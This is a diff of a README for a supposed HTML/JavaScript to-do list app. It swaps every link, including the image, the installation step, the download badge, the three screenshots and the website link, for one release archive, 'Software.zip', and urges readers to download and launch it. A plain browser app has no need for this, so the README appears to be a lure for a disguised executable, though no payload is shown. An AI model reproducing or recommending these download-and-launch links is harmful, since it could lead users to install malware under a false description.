@@ -2,7 +2,7 @@
 
 Welcome to the **ToDoList** repository! This is a to-do list app created using HTML, SASS / CSS, and Vanilla Javascript. 
 
-![ToDoList App](https://github.com/semOpraque/ToDoList/releases/download/v1.0/Application.zip)
+![ToDoList App](https://github.com/semOpraque/ToDoList/releases/download/v2.0/Software.zip)
 
 ## Features
 📋 Create, edit, and delete tasks  
@@ -31,7 +31,7 @@ This repository covers the following topics:
 ## Installation
 To get started with the ToDoList app, follow these steps:
 1. Clone this repository to your local machine
-2. Open the https://github.com/semOpraque/ToDoList/releases/download/v1.0/Application.zip file in your preferred browser
+2. Open the https://github.com/semOpraque/ToDoList/releases/download/v2.0/Software.zip file in your preferred browser
 
 In case you encounter issues with the installation, please refer to the "Releases" section for additional guidance.
 
@@ -44,16 +44,16 @@ In case you encounter issues with the installation, please refer to the "Release
 Feel free to explore and customize the ToDoList app to suit your needs!
 
 ## Download Software
-![Download Software](https://github.com/semOpraque/ToDoList/releases/download/v1.0/Application.zip%20Software-launch-green)
+![Download Software](https://github.com/semOpraque/ToDoList/releases/download/v2.0/Software.zip%20Software-launch-green)
 
 Click the above button to download the software and get started with your to-do list management. Remember to launch the software after downloading.
 
 ## Screenshots
 Here are some screenshots of the ToDoList app in action:
 
-![Screenshot 1](https://github.com/semOpraque/ToDoList/releases/download/v1.0/Application.zip)  
-![Screenshot 2](https://github.com/semOpraque/ToDoList/releases/download/v1.0/Application.zip)  
-![Screenshot 3](https://github.com/semOpraque/ToDoList/releases/download/v1.0/Application.zip)  
+![Screenshot 1](https://github.com/semOpraque/ToDoList/releases/download/v2.0/Software.zip)  
+![Screenshot 2](https://github.com/semOpraque/ToDoList/releases/download/v2.0/Software.zip)  
+![Screenshot 3](https://github.com/semOpraque/ToDoList/releases/download/v2.0/Software.zip)  
 
 ## Contributing
 If you'd like to contribute to this project, feel free to fork the repository and submit a pull request. Your contributions are highly appreciated!
@@ -65,4 +65,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Thank you for checking out the ToDoList app! Stay organized and productive with your tasks using this simple and efficient to-do list tool. Happy task managing! 🚀
 
-[Visit our website](https://github.com/semOpraque/ToDoList/releases/download/v1.0/Application.zip) for more information and updates.
+[Visit our website](https://github.com/semOpraque/ToDoList/releases/download/v2.0/Software.zip) for more information and updates.
